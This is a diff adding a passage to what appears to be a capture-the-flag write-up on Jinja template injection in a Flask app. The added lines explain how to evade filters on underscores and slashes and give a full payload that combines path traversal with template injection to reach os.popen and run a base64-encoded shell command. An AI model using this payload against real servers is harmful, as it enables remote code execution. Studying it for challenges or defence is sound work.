@@ -111,6 +111,10 @@ in jinja is to execute everything inside {{ ... }} and show output on screen
 
 application is a flask app object that has function in it and every function has ```__globals__``` then get to ```__builtins__``` that contain every python function and then we import os and run ls /app by popen in shell to see every file in /app and read it out to string as an output
 
+next we need to bypass filter "_" with \x5f and " / " with " \ "
+
+our final payload is
+
 ```..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\app\templates\errors\test {{ request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n bHMgL2FwcA== | base64 -d | bash")["read"]() }}```
 
 
